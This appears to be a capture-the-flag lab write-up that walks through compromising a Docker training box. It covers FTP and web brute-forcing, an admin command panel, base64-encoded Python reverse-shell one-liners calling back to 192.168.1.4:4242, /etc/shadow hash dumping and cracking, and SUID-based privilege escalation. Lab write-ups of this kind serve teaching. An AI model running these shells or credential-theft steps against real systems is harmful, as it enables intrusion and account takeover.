# Bens Writup

## Note

Weirdness when starting docker

```
flask_1  | /home/manager/source.c:1:10: fatal error: stdio.h: No such file or directory
flask_1  |     1 | #include <stdio.h>
flask_1  |       |          ^~~~~~~~~
```

(See how this bites later)

## Initial Recon

Nmap
 
  - FTP 
  - HTTP (5000)


```
$ docker run --rm -v "/home/dang/Wordlists:/wordlists" devalias/gobuster -w /wordlists/common.txt -u http://192.168.1.4:5000 -x html -s 200,403

Gobuster v1.3                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.4:5000/
[+] Threads      : 10
[+] Wordlist     : /wordlists/common.txt
[+] Status codes : 200,403
[+] Extensions   : .html
=====================================================
/admin (Status: 403)
/console (Status: 200)
/login (Status: 200)
/register (Status: 200)
=====================================================
```


Web page

Create some creds

 - foo@bar.net
 - foo
 - bar
 
Tells me to go to the notes page...

## So with the login

 - Unknown user we get "user does not exist"
 - Known user we get "invalid password"
 - We dont have SQLi,  but meh at least we know we can enum users

## FTP

Anoynmous login is ok

```
dang@dang-laptop ~/Github/Teaching/BuildEvent/Writeups/Ben$ ftp 172.23.0.3                 ✭Smoos 
Connected to 172.23.0.3.
220 Welcome to an awesome public FTP Server
Name (172.23.0.3:dang): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0           56457 Apr 03 20:50 wordlist.txt
226 Directory send OK.
```

Leaks a bit of info,  about strong paswords / common passowrds etc


```
Staff Annoucement!

We are now diverting all resources to project codename Stellavirus. This has meant our security teams have stopped the upgrade of our website. Please can we ensure we are using strong passwords, I have a list of passwords and I am disappointed to see some of you using passwords common enough to appear on this list! 

Until this project is complete. Myself and the intern managing the website shall have admin access to the website.

Regards,

~ Manager
```

## HTTP Logins

 - admin / administrator  FAIL
 - intern WORKS


## Back to FTP 

Ok, so trying some standard password with HTTP fails, 
Lets go back to FTP and see if there are permissions at play here

First Bruteforce (based on clue about lists of creds) using this. 

https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt





['ftp', 'b1uRR3']
Login Successful

Using those creds didnt seem to give my anything new for FTP, bugger, anything hidden
(Perhaps I should have checked this before... Turns out it also appears with the anon user.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             474 Apr 03 20:50 announcement.txt
226 Directory send OK.
ftp> 
```



## Brute Force Web

Not in the top 10k.. That sucks.

But we can try that wordlist we found (and fix my code)

```
Attempt my_wifes_birthday
Success
```

## Admin Panel 

So now we get an admin panel that lets us run commands.
Looks like system as standard.

No netcat and wget etc wont be too much use

ls /home/intern

```
Result:__pycache__ create_db.py main.py runapp.sh static templates 
```

ls /home/manager

```
Result:total 12 -rw-r--r-- 1 root root 3151 Apr 3 20:50 research.txt -rw-r--r-- 1 root root 159 Apr 3 20:50 source.c -r-------- 1 root root 36 Apr 3 20:50 user.txt 
```

## The Run app

Cuz we don't just run scripts 

cat /home/intern/runscript.sh

```
Result:#!/bin/bash gcc /home/manager/source.c -o /home/manager/runme chown manager /home/manager/runme sudo -u manager chmod +s /home/manager/runme sudo -u intern python3 /home/intern/create_db.py sudo -u intern python3 /home/intern/main.py
```

```
#!/bin/bash 
gcc /home/manager/source.c -o /home/manager/runme 
chown manager /home/manager/runme 
sudo -u manager chmod +s /home/manager/runme 
sudo -u intern python3 /home/intern/create_db.py 
sudo -u intern python3 /home/intern/main.py
```


## Try to get a better shell

export RHOST="192.168.1.4";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

Python is blocked so base 64


python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((162.168.1.4,4242)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

ZXhwb3J0IFJIT1NUPSIxOTIuMTY4LjEuNCI7ZXhwb3J0IFJQT1JUPTQyNDI7cHl0aG9uIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KChvcy5nZXRlbnYoIlJIT1NUIiksaW50KG9zLmdldGVudigiUlBPUlQiKSkpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIiknCg==


```
echo "cHl0aG9uIC1jICdpbXBvcnQgc3lzLHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTkyLjE2OC4xLjQiLDQyNDIpKTtbb3MuZHVwMihzLmZpbGVubygpLGZkKSBmb3IgZmQgaW4gKDAsMSwyKV07cHR5LnNwYXduKCIvYmluL3NoIiknCgo=" | base64 -d | /bin/sh
```

So that's a bit of a fucker,  why isnt that working...  Python version and damn Debian...

As python is blocked..  

Whic python (d2hpY2ggcHl0aG9u) gives me nothing

Python3 does exist


cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjE5Mi4xNjguMS40Iiw0MjQyKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwoK


echo "cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjE5Mi4xNjguMS40Iiw0MjQyKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJwoK" | base64 -d | /bin/sh

And it hangs which is a great sign...


## Manager....

intern@4829678f439b:/home/manager$ echo "/bin/bash" > /tmp/cat
intern@4829678f439b:/home/manager$ chmod +x /tmp/cat
chmod +x /tmp/cat

However I dont have the correct permissions to SUID that.
A bit fo recon later...  /etc/shdow it readable

```
['', '6', 'oFWC0rkHygWWmjgZ', 'enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/']
$6$oFWC0rkHygWWmjgZ
Found s3cret_passw0rd

```

Then 

```
su manager...
manager@4829678f439b:~$ id
id
uid=222(manager) gid=222(manager) groups=222(manager),1000(rootish)
```

Ok so now we have 

```
manager@4829678f439b:~$ ls -l /usr/bin/cp
ls -l /usr/bin/cp
-rwsr-xr-x 1 manager root 153976 Sep  5  2019 /usr/bin/cp
```


Which still isnt much use.  However id gives us rootish group

```
manager@4829678f439b:~$ find / -group rootish 2>/dev/null
find / -group rootish 2>/dev/null
/etc/shadow
```

```
ls -l /etc/shadow
-rw-r--r-- 1 root rootish 859 Apr  3 20:54 /etc/shadow
```

While i cant write directly,  perhaps I can copy 

```
root:$6$Mho/yWVF4uag7ASh$Zpc.ryZVLWxiL81V.ykROK2RgtoWq3v58NqhCLHXAC1Pq7E8.i9dFU6/uO.9ySG/zjceCxhTzhIpb43BRVJBm.:18720:0:99999:7:::
daemon:*:18718:0:99999:7:::
bin:*:18718:0:99999:7:::
sys:*:18718:0:99999:7:::
sync:*:18718:0:99999:7:::
games:*:18718:0:99999:7:::
man:*:18718:0:99999:7:::
lp:*:18718:0:99999:7:::
mail:*:18718:0:99999:7:::
news:*:18718:0:99999:7:::
uucp:*:18718:0:99999:7:::
proxy:*:18718:0:99999:7:::
www-data:*:18718:0:99999:7:::
backup:*:18718:0:99999:7:::
list:*:18718:0:99999:7:::
irc:*:18718:0:99999:7:::
gnats:*:18718:0:99999:7:::
nobody:*:18718:0:99999:7:::
_apt:*:18718:0:99999:7:::
intern:$6$7bGJuDAJYbtjddHs$orq2RKCGNDPvIzwCkcE3aEX7TA7LDrS2ToYYcAm7Bc4UP0VhrptKLptRhwPsojkOxqF8DV3BWmPN39or8n0Ox0:18720::::::
manager:$6$oFWC0rkHygWWmjgZ$enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/:18720::::::
```

Replace root with manager and 

```
cat '<big string' > newShadow
```

Nope


## Turns out we didnt have correct perms on the SUID

Modify runme.sh

```
chown root:manager /home/manager/runme
```

And now we should be good to go..




## Other Things

Create DB Script

```
Result:from main import db, uuid, User, Notes def addUsers(users): for x in users: db.session.add(x) db.session.commit() def addNotes(notes): for x in notes: db.session.add(x) db.session.commit() if __name__ == "__main__": print("@>Initializing Database for webapp") db.create_all() print("@>Creating Users") admin_uuid=str(uuid.uuid4()) noah_uuid=str(uuid.uuid4()) users = [ #User(username='admin', email='admin@sharklabs.local', uuid=admin_uuid, admin_cap=True, password="0d3ae6d144edfb313a9f0d32186d4836791cbfd5603b2d50cf0d9c948e50ce68"), User(username="intern", email="intern@canely.com", uuid=admin_uuid, admin_cap=True, password="1a5216617482939c6e719d62e66fd6cdf2392a9a1a32c3cb132ae3b702c471ff")] # my_wifes_birthday print("@>Adding Users") addUsers(users) print("@>DONE. Database initialized and populated.") 
```
